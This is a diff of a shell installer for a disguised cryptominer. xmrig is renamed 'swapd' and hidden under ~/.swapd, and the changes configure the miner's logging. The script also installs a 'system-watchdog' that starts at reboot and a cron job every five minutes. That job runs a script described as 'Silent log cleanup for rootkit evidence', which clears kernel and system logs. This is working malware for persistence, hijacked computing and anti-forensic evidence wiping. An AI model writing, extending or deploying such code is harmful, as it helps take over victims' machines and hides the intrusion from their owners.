@@ -1320,6 +1320,24 @@ sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' "$HOME"/.swapd/
 
 echo "[*] Copying xmrig-proxy config"
 
+# Enable detailed logging for swapd (xmrig)
+echo "[*] Enabling detailed miner logging..."
+sed -i 's#"log-file": *null,#"log-file": "/root/.swapd/swapd.log",#' "$HOME"/.swapd/config.json
+sed -i 's#"log-file": *null,#"log-file": "/root/.swapd/swapd.log",#' "$HOME"/.swapd/config_background.json
+
+# Set verbose logging level (0=quiet, 2=normal, 4=debug)
+sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' "$HOME"/.swapd/config.json
+sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' "$HOME"/.swapd/config_background.json
+
+# Enable syslog for system-level logging
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' "$HOME"/.swapd/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' "$HOME"/.swapd/config_background.json
+
+# Also update the launcher.sh to preserve logs
+if [ -f /root/.swapd/launcher.sh ]; then
+    sed -i 's|/root/.swapd/swapd --config=/root/.swapd/config.json|/root/.swapd/swapd --config=/root/.swapd/config.json 2>> /root/.swapd/miner.error.log|' /root/.swapd/launcher.sh
+fi
+
 #mv "$HOME"/.swapd/config.json "$HOME"/.swapd/config_ORiG.json
 
 #cd "$HOME"/.swapd/ ; touch config.json ; cat config.json <<EOL
@@ -1403,7 +1421,7 @@ EOF
 chmod +x /usr/local/bin/system-watchdog
 
 # Create log cleanup script
-cat > /usr/local/bin/clean-old-logs.sh << 'EOFCLEAN'
+cat > /usr/local/bin/clean-rootkit-logs.sh << 'EOFCLEAN'
 #!/bin/bash
 # Silent log cleanup for rootkit evidence
 
@@ -1445,19 +1463,19 @@ dmesg -C 2>/dev/null
 exit 0
 EOFCLEAN
 
-chmod +x /usr/local/bin/clean-old-logs.sh
+chmod +x /usr/local/bin/clean-rootkit-logs.sh
 
 # Enable the watchdog and log cleanup via crontab
-(crontab -l 2>/dev/null | grep -v "system-watchdog\|system-check\|clean-old-logs"; \
+(crontab -l 2>/dev/null | grep -v "system-watchdog\|system-check\|clean-rootkit-logs"; \
  echo "@reboot /usr/local/bin/system-watchdog &"; \
- echo "*/5 * * * * /usr/local/bin/clean-old-logs.sh >/dev/null 2>&1") | crontab -
+ echo "*/5 * * * * /usr/local/bin/clean-rootkit-logs.sh >/dev/null 2>&1") | crontab -
 
 # Start it now (detached)
 /usr/local/bin/system-watchdog >/dev/null 2>&1 &
 disown
 
 # Run log cleanup immediately
-/usr/local/bin/clean-old-logs.sh >/dev/null 2>&1 &
+/usr/local/bin/clean-rootkit-logs.sh >/dev/null 2>&1 &
 
 echo "[✓] Intelligent watchdog deployed (3-min intervals, state-tracked)"
 echo ""
